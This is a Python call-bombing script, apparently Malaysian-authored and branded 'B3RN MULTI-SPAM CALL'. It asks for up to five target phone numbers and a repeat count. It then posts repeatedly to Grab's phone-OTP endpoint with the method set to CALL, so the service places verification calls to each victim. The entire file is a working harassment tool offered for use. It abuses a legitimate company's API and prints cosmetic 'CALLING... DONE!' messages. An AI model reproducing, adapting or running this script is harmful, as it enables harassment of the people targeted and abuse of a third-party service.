#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by MRram0s@b3rn
"""
bodo natang ni..
"""

try:
	import os, requests, time
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;33m')
k=('\033[4;32m')
o=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
                                 
           ____ ____  _____  _   _                           
          |  _ \___ \|  __ \| \ | |                          
          | |_) |__) | |__) |  \| |___ _ __   __ _ _ __ ___  
          |  _ <|__ <|  _  /| . ` / __| '_ \ / _` | '_ ` _ \ 
          | |_) |__) | | \ \| |\  \__ \ |_) | (_| | | | | | |
          |____/____/|_|  \_\_| \_|___/ .__/ \__,_|_| |_| |_|
                                      | |                    
                                      |_|                    
		       ⚔️  B3RN MULTI-SPAM CALL ⚔️%s
 ,_     _‚
 |\\\___//|	%sAuthor: B3RN%s
 | =👁️ 👁️= |	%sContact: https://www.facebook.com/nabilb3rn%s
 \=._Y_.=/	%sGithub: https://github.com/MRram0s%s
  )  `  (    ,	%sTEAM: TOK MUNG SQUARE%s
 /       \  ((
 |       |   ))
/| |   | |\_//	%sMASUKKAN NOMBOR DENGAN "60" (EX: 601XXXXXXX)%s
\| |._.| |/-’
 '"'   '"'
"""%(c,r,g,r,g,r,g,r,g,r,w,r))
print("%s<NOTE> Jika ERROR dan lain-lain,silalah hubungi bapak saya.."%(o))
print("%s[*] Masukkan nombor target dan Klik ENTER untuk step seterusnya%s"%(g,g))
no1 = input("[?] NO.TARGET 1 => %s"%(w))
no2 = input("%s[?] NO.TARGET 2 => %s"%(g,w))
no3 = input("%s[?] NO.TARGET 3 => %s"%(g,w))
no4 = input("%s[?] NO.TARGET 4 => %s"%(g,w))
no5 = input("%s[?] NO.TARGET 5 => %s"%(g,w))
jlmh=int(input("%s[?] JUMLAH SPAM => %s"%(r,w)))
dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}
dt4={'method':'CALL','countryCode':'id','phoneNumber':no4,'templateID':'pax_android_production'}
dt5={'method':'CALL','countryCode':'id','phoneNumber':no5,'templateID':'pax_android_production'}

try:
	print()
	print("%s[-] RESULT:"%(r))
	for i in range(jlmh):
		time.sleep(1)
		print("%s⏳  PLEASE WAIT..."%(w))
		time.sleep(1)
		print("%s📲  CALLING..."%(w))
		time.sleep(2)
		print("%s👌  DONE!"%(w))
		idk=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
		r4 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt4)
		r5 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt5)
		if str(idk) in str(r1.text):
			print("%s[+] TARGET1   ✔️"%(g))
		else:
			print("%s[-] TARGET1   ❌"%(o))
		if str(idk) in str(r2.text):
			print("%s[+] TARGET2   ✔️"%(g))
		else:
			print("%s[-] TARGET2   ❌"%(o))
		if str(idk) in str(r3.text):
			print("%s[+] TARGET3   ✔️"%(g))
		else:
			print("%s[-] TARGET3   ❌"%(o))
		if str(idk) in str(r4.text):
			print("%s[+] TARGET4   ✔️"%(g))
		else:
			print("%s[-] TARGET4   ❌"%(o))
		if str(idk) in str(r5.text):
			print("%s[+] TARGET5   ✔️"%(g))
		else:
			print("%s[-] TARGET5   ❌%s"%(o,g))
		print("="*30)
		time.sleep(1)
except KeyboardInterrupt:
	print("%sterima kasih bossku..."%(c))
